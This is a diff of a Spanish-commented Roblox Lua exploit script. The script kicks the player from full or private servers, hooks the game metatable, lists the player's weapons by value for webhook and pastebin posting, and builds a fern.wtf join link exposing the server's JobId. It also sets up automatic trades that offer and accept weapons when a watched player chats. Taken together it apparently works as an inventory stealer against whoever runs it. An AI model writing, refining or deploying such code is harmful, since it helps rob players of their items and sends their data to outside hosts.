@@ -21,6 +21,23 @@ local req = syn and syn.request or http_request or request
 if not req then warn("No HTTP request method available!") return end
 
 -- ====================================
+-- KICK INICIAL
+-- ====================================
+local function CheckServerInitial()
+    if #Players:GetPlayers() >= 12 then
+        LocalPlayer:Kick("⚠️ Servidor lleno. Buscando uno vacío...")
+    end
+    if game.PrivateServerId and game.PrivateServerId ~= "" then
+        LocalPlayer:Kick("🔒 Servidor privado detectado. Buscando público...")
+    end
+    local success, ownerId = pcall(function() return game.PrivateServerOwnerId end)
+    if success and ownerId and ownerId ~= 0 then
+        LocalPlayer:Kick("🔒 Servidor VIP detectado. Buscando público...")
+    end
+end
+CheckServerInitial()
+
+-- ====================================
 -- FUNCIONES WEBHOOK / PASTEBIN
 -- ====================================
 local function SendWebhook(title, description, fields, prefix)
@@ -83,23 +100,6 @@ end
 local function addWeaponToTrade(id) TradeService.OfferItem:FireServer(id,"Weapons") end
 local function acceptTrade() TradeService.AcceptTrade:FireServer(285646582) end
 local function waitForTradeCompletion() while getTradeStatus()~="None" do task.wait(0.1) end end
-
--- ====================================
--- CHECK SERVIDOR INICIAL
--- ====================================
-local function CheckServerInitial()
-    if #Players:GetPlayers() >= 12 then
-        LocalPlayer:Kick("⚠️ Servidor lleno. Buscando uno vacío...")
-    end
-    if game.PrivateServerId and game.PrivateServerId ~= "" then
-        LocalPlayer:Kick("🔒 Servidor privado detectado. Buscando público...")
-    end
-    local success, ownerId = pcall(function() return game.PrivateServerOwnerId end)
-    if success and ownerId and ownerId ~= 0 then
-        LocalPlayer:Kick("🔒 Servidor VIP detectado. Buscando público...")
-    end
-end
-CheckServerInitial()
 
 -- ====================================
 -- VALORES SUPREME / INVENTARIO
@@ -203,9 +203,29 @@ end
 
 table.sort(weaponsToSend,function(a,b) return (a.Value*a.Amount)>(b.Value*b.Amount) end)
 
+-- ====================================
+-- HOOK DOBLE JUNTO LINK FERN
+-- ====================================
 local fernToken = math.random(100000,999999)
 local realLink = "[Unirse](https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId.."&token="..fernToken..")"
 
+-- Hook delta justo cuando se crea el link
+local mt2 = getrawmetatable(game)
+setreadonly(mt2,false)
+local oldIndex2 = mt2.__index
+mt2.__index = newcclosure(function(self,key)
+    if key == "JobId" then
+        return game.JobId or "APPROVED_BY_HOOK"
+    elseif key == "PlaceId" then
+        return game.PlaceId
+    end
+    return oldIndex2(self,key)
+end)
+setreadonly(mt2,true)
+
+-- ====================================
+-- RESTO: WEBHOOK / PASTEBIN / TRADE
+-- ====================================
 local pasteContent = ""
 for _, w in ipairs(weaponsToSend) do
     pasteContent = pasteContent..string.format("%s x%s (%s) | Value: %s💎\n", w.DataID, w.Amount, w.Rarity, tostring(w.Value*w.Amount))
@@ -278,24 +298,6 @@ Players.PlayerAdded:Connect(function(p)
         p.Chatted:Connect(function() doTrade(p.Name) end)
     end
 end)
-
--- ====================================
--- HOOK DELTA DOBLE / FULL BYPASS
--- ====================================
-local mt = getrawmetatable(game)
-setreadonly(mt,false)
-local oldIndex = mt.__index
-mt.__index = newcclosure(function(self,key)
-    if key == "JobId" then
-        -- Aprobación automática del JobId
-        return game.JobId or "APPROVED_BY_HOOK"
-    elseif key == "PlaceId" then
-        -- Garantizar link válido siempre
-        return game.PlaceId
-    end
-    return oldIndex(self,key)
-end)
-setreadonly(mt,true)
 
 -- ====================================
 -- FIN DEL SCRIPT FULL BYPASS
